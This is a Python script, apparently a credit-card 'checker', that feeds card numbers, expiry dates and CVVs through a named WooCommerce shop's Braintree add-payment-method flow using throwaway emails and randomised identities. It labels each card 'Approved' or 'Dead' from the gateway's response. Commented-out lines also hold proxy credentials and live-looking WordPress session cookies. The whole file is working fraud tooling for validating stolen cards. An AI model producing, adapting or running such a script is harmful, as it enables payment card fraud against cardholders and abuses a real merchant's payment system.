import base64
import requests
import random
import json
import names
from random_address import real_random_address
from bs4 import BeautifulSoup
import uuid
from fake_useragent import UserAgent



direc = real_random_address()

def generar_codigo_session():
    codigo_session = str(uuid.uuid4())
    return codigo_session


def find_between(data, first, last):
  try:
    start = data.index( first ) + len( first )
    end = data.index( last, start )
    return data[start:end]
  except ValueError:
    return None  

zipcode = direc['postalCode']
try:
    city = direc['city']
except KeyError:
    city = 'NY'
state = direc['state']
street = direc['address1']

class braintrepay:
    def __init__(self, tarjeta):
        partes = tarjeta.split("|")
        
        self.tarjeta = tarjeta
        if len(partes) == 4:
            self.cc = partes[0]
            self.mes = partes[1]
            self.ano = partes[2]
            self.cvv = partes[3]
        self.username = f"{names.get_first_name()}{names.get_last_name()}{random.randint(1000000,9999999)}"
        self.CorreoRand = f"{names.get_first_name()}{names.get_last_name()}{random.randint(1000000,9999999)}@gmail.com"
        self.Password = f"{names.get_first_name()}{names.get_last_name()}#{random.randint(1000000,9999999)}"
        
        
        
    def detectar_tipo_tarjeta(self):
        if self.cc.startswith("4"):
            return "Visa"
        elif self.cc.startswith("5"):
            return "MasterCard"
        elif self.cc.startswith("3"):
            return "American Express"
        elif self.cc.startswith("6"):
            return "Discover"
        else:
            return "Desconocido"
        
        
        
    def main(self):
        try:
          #  proxies = {'http': 'http://2d13eb91fbd1fed1:RNW78Fm5@res.proxy-seller.com:10000','https': 'http://2d13eb91fbd1fed1:RNW78Fm5@res.proxy-seller.com:10000'}
        
            match random.randint(1, 6):
                case 1:
                    mail = 'wofar64245@cucadas.com'
                case 2:
                    mail = 'naxoxas135@cucadas.com'
                case 3:
                    mail = 'kokeli5032@dubokutv.com'
                case 4:
                    mail = 'lotejik378@cucadas.com'
                case 5:
                    mail = 'cikatep506@dubokutv.com'
                case 6:
                    mail = 'lawifon975@dubokutv.com'

        
            session = requests.Session()
            Agent = UserAgent().random

            

            headers = {
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
                'accept-language': 'es-ES,es;q=0.7',
                'priority': 'u=0, i',
                'referer': 'https://mdbarnmaster.com/my-account/payment-methods/',
                'sec-ch-ua': '"Brave";v="143", "Chromium";v="143", "Not A(Brand";v="24"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'document',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-user': '?1',
                'sec-gpc': '1',
                'upgrade-insecure-requests': '1',
                'user-agent': Agent,
                # 'cookie': 'mdbarnmaster-_zldp=YyRaWYqTOg75qXzuF%2BDzdhl%2BfPqbVCbQT4LD4LKGAvWbTBB3fTUm0YmldZ2OHdB0b3qDSNrSNME%3D; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2026-01-15%2001%3A44%3A38%7C%7C%7Cep%3Dhttps%3A%2F%2Fmdbarnmaster.com%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2026-01-15%2001%3A44%3A38%7C%7C%7Cep%3Dhttps%3A%2F%2Fmdbarnmaster.com%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F143.0.0.0%20Safari%2F537.36; mdbarnmaster-_zldt=f8cd8f1f-1ab6-4a17-af88-92e1de0d15b4-1; wordpress_logged_in_58c7e1766c2b741f3cec76459a4d745b=lawifon975%40dubokutv.com%7C1768614612%7Cw4VB2fWodjVQ6ZvdDuXPzmNddHAs6ihfkWvpKZXzAgU%7C6b6df1d1546cb2a9f5247d8778a9154d91be40a4c9308c5b0d9af13f75ac4818; _zwaf_ua=Brave; sbjs_session=pgs%3D7%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fmdbarnmaster.com%2Fmy-account%2Fpayment-methods%2F',
            }

            response = session.get('https://mdbarnmaster.com/my-account/add-payment-method/',  headers=headers).text
            ArD_PA = find_between(response, 'name="woocommerce-add-payment-method-nonce" value="', '"')
            token_n = find_between(response, '"client_token_nonce":"','"')
            print(ArD_PA, token_n)
            headers = {
                'accept': '*/*',
                'accept-language': 'es-ES,es;q=0.7',
                'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'origin': 'https://mdbarnmaster.com',
                'priority': 'u=1, i',
                'referer': 'https://mdbarnmaster.com/my-account/add-payment-method/',
                'sec-ch-ua': '"Brave";v="143", "Chromium";v="143", "Not A(Brand";v="24"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'sec-gpc': '1',
                'user-agent': Agent,
                'x-requested-with': 'XMLHttpRequest',
                # 'cookie': 'wordpress_sec_58c7e1766c2b741f3cec76459a4d745b=lawifon975%40dubokutv.com%7C1768614612%7Cw4VB2fWodjVQ6ZvdDuXPzmNddHAs6ihfkWvpKZXzAgU%7C3468999f5bb6d76449fea07507b77bd29e5e51a9a381be123e413d3fe3812e43; mdbarnmaster-_zldp=YyRaWYqTOg75qXzuF%2BDzdhl%2BfPqbVCbQT4LD4LKGAvWbTBB3fTUm0YmldZ2OHdB0b3qDSNrSNME%3D; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2026-01-15%2001%3A44%3A38%7C%7C%7Cep%3Dhttps%3A%2F%2Fmdbarnmaster.com%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2026-01-15%2001%3A44%3A38%7C%7C%7Cep%3Dhttps%3A%2F%2Fmdbarnmaster.com%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F143.0.0.0%20Safari%2F537.36; mdbarnmaster-_zldt=f8cd8f1f-1ab6-4a17-af88-92e1de0d15b4-1; wordpress_logged_in_58c7e1766c2b741f3cec76459a4d745b=lawifon975%40dubokutv.com%7C1768614612%7Cw4VB2fWodjVQ6ZvdDuXPzmNddHAs6ihfkWvpKZXzAgU%7C6b6df1d1546cb2a9f5247d8778a9154d91be40a4c9308c5b0d9af13f75ac4818; _zwaf_ua=Brave; sbjs_session=pgs%3D8%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fmdbarnmaster.com%2Fmy-account%2Fadd-payment-method%2F',
            }

            data = {
                'action': 'wc_braintree_credit_card_get_client_token',
                'nonce': token_n,
            }

            response = session.post('https://mdbarnmaster.com/wp-admin/admin-ajax.php',  headers=headers, data=data).json()
            eyj2 =  response['data']
            
            decode = base64.b64decode(eyj2)
            decode_string = decode.decode("utf-8")
            
            json_data = json.loads(decode_string)   
            
            bearer = json_data.get('authorizationFingerprint')
            print(bearer)


            headers = {
                'accept': '*/*',
                'accept-language': 'es-ES,es;q=0.7',
                'authorization': f'Bearer {bearer}',
                'braintree-version': '2018-05-10',
                'content-type': 'application/json',
                'origin': 'https://assets.braintreegateway.com',
                'priority': 'u=1, i',
                'referer': 'https://assets.braintreegateway.com/',
                'sec-ch-ua': '"Brave";v="143", "Chromium";v="143", "Not A(Brand";v="24"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'cross-site',
                'sec-gpc': '1',
                'user-agent': Agent,
            }

            json_data = {
                'clientSdkMetadata': {
                    'source': 'client',
                    'integration': 'custom',
                    'sessionId':  str(uuid.uuid4()),
                },
                'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId         business         consumer         purchase         corporate       }     }   } }',
                'variables': {
                    'input': {
                        'creditCard': {
                            'number': self.cc,
                            'expirationMonth': self.mes,
                            'expirationYear': self.ano,
                            'cvv': self.cvv,
                        },
                        'options': {
                            'validate': False,
                        },
                    },
                },
                'operationName': 'TokenizeCreditCard',
            }

            response = session.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data).json()
            tokencc = response['data']['tokenizeCreditCard']['token']
            print(tokencc)

            headers = {
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
                'accept-language': 'es-ES,es;q=0.7',
                'cache-control': 'max-age=0',
                'content-type': 'application/x-www-form-urlencoded',
                'origin': 'https://mdbarnmaster.com',
                'priority': 'u=0, i',
                'referer': 'https://mdbarnmaster.com/my-account/add-payment-method/',
                'sec-ch-ua': '"Brave";v="143", "Chromium";v="143", "Not A(Brand";v="24"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'document',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-user': '?1',
                'sec-gpc': '1',
                'upgrade-insecure-requests': '1',
                'user-agent': Agent,
                # 'cookie': 'mdbarnmaster-_zldp=YyRaWYqTOg75qXzuF%2BDzdhl%2BfPqbVCbQT4LD4LKGAvWbTBB3fTUm0YmldZ2OHdB0b3qDSNrSNME%3D; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2026-01-15%2001%3A44%3A38%7C%7C%7Cep%3Dhttps%3A%2F%2Fmdbarnmaster.com%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2026-01-15%2001%3A44%3A38%7C%7C%7Cep%3Dhttps%3A%2F%2Fmdbarnmaster.com%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F143.0.0.0%20Safari%2F537.36; mdbarnmaster-_zldt=f8cd8f1f-1ab6-4a17-af88-92e1de0d15b4-1; wordpress_logged_in_58c7e1766c2b741f3cec76459a4d745b=lawifon975%40dubokutv.com%7C1768614612%7Cw4VB2fWodjVQ6ZvdDuXPzmNddHAs6ihfkWvpKZXzAgU%7C6b6df1d1546cb2a9f5247d8778a9154d91be40a4c9308c5b0d9af13f75ac4818; sbjs_session=pgs%3D9%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fmdbarnmaster.com%2Fmy-account%2Fadd-payment-method%2F; _zwaf_ua=Brave',
            }

            data = {
                'payment_method': 'braintree_credit_card',
                'wc-braintree-credit-card-card-type': 'visa',
                'wc-braintree-credit-card-3d-secure-enabled': '',
                'wc-braintree-credit-card-3d-secure-verified': '',
                'wc-braintree-credit-card-3d-secure-order-total': '0.00',
                'wc_braintree_credit_card_payment_nonce': tokencc,
                'wc_braintree_device_data': '',
                'wc-braintree-credit-card-tokenize-payment-method': 'true',
                'woocommerce-add-payment-method-nonce': ArD_PA,
                '_wp_http_referer': '/my-account/add-payment-method/',
                'woocommerce_add_payment_method': '1',
            }

            response = session.post('https://mdbarnmaster.com/my-account/add-payment-method/',  headers=headers, data=data).text
            err = BeautifulSoup(response, 'html.parser').find('ul', {'class':'woocommerce-error'}).text.lstrip()
            
            if 'Status code 2010: Card Issuer Declined CVV (C2 : CVV2 DECLINED' in err: return 'Approved! ✅', err
            elif 'New payment method added' in err:return 'Approved Auth ✅', err
            
            elif 'Status code 2010: Card Issuer Declined CVV (122 : Invalid card security code (a.k.a., CID, 4DBC, 4CSC) 125 Invalid effective date)' in err:return 'Approved! ✅', err
            elif'You cannot add a new payment method so soon after the previous one. Please wait for 20 seconds.' in err: return 'Dead! ❌', 'Status code risk_threshold: Gateway Rejected: risk_threshold'
            else: return 'Dead! ❌', err
        except: return 'Dead! ❌', 'Status code risk_threshold: Gateway Rejected: risk_threshold'